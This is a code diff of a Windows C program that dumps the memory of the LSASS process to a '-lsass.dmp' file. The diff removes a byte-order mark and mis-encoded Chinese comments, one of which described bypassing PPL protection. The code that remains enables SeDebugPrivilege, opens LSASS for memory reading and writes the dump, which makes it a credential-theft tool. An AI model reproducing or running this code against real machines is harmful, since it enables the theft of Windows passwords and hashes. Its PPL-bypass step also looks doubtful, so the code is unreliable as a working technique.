@@ -1,4 +1,4 @@
-﻿#include <windows.h>
+#include <windows.h>
 #include <stdio.h>
 #include <tchar.h>
 #include <psapi.h>
@@ -8,7 +8,6 @@
 
 int _tmain(int argc, TCHAR* argv[])
 {
-	// »ñÈ¡Lsass½ø³ÌID
 	DWORD dwLsassPID = 0;
 	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 	if (hSnap == INVALID_HANDLE_VALUE)
@@ -36,7 +35,7 @@ int _tmain(int argc, TCHAR* argv[])
 	}
 
 
-	// ¿ªÆôSeDebugPrivilege
+	
 	HANDLE hToken;
 	TOKEN_PRIVILEGES TokenPrivileges;
 	BOOL bResult;
@@ -66,10 +65,10 @@ int _tmain(int argc, TCHAR* argv[])
 	}
 
 
-	// ÈÆ¹ýPPL±£»¤
+
 	DefineDosDevice(DDD_RAW_TARGET_PATH, _T("LSASS"), _T("\\Device\\LSASS"));
 
-	// ´ò¿ªLSASS½ø³Ì¾ä±ú
+	
 	HANDLE hLsass = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ, FALSE, dwLsassPID);
 	if (hLsass == NULL)
 	{
@@ -77,12 +76,12 @@ int _tmain(int argc, TCHAR* argv[])
 		return 1;
 	}
 
-	// »ñÈ¡LSASS½ø³ÌµÄ¾ä±úÎÄ¼þÃû
+	
 	TCHAR szFileName[MAX_PATH];
 	DWORD dwSize = MAX_PATH;
 	QueryFullProcessImageName(hLsass, 0, szFileName, &dwSize);
 
-	// ´ò¿ªLSASS½ø³Ì¾ä±ú
+	
 	HANDLE hLsassFile = CreateFile(szFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
 
 	if (hLsassFile == INVALID_HANDLE_VALUE)
@@ -96,7 +95,7 @@ int _tmain(int argc, TCHAR* argv[])
 		return 1;
 	}
 
-	// µ¼³öLsass½ø³ÌÄÚ´æ
+	
 	_stprintf_s(szFileName, MAX_PATH, _T("%s-lsass.dmp"), argv[0]);
 
 	HANDLE hFile = CreateFile(szFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
